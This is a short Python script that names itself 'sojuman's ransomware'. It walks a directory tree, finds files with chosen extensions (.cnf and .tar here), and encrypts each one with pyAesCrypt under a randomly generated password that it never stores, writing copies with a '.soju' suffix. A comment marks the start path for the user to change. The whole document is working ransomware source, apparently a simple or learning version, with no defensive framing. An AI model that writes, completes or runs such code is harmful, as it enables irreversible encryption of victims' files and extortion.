import os
import string
import random
import pyAesCrypt

def walk(drive, extensions):
    target_file = []

    for root, dirs, files in os.walk(drive):
        for name in files:
            if name.endswith(extensions):
                #print ("[DEBUG] Found: ", os.path.join(root,name))
                target_file.append(os.path.join(root,name))

    print ("[DEBUG] [+] Walking.... done")
    return target_file

def encrypt(files):
    bufferSize = 64*1024
    password = ''.join(random.choices(string.ascii_letters + string.digits + "/?!@#$%^&*()-=+", k=24))

    for file in files:
        encFile = file + ".soju"
        print("[DEBUG] [+] file = ", file, " Encrypted filename = ", encFile)
        pyAesCrypt.encryptFile(file, encFile, password, bufferSize)

def main():
    print ("="*50)
    print ("="*5, "Welcome to sojuman's ransomware","="*5)
    print ("="*50)
    extensions = (".cnf",".tar")

    # Getting All Target Files...
    starting_path = "."     ##### CHANGE THIS ######
    target_file = walk(starting_path, extensions)
    print ("[DEBUG] [+] List of targeted files\n", target_file)

    encrypt(target_file)

main()


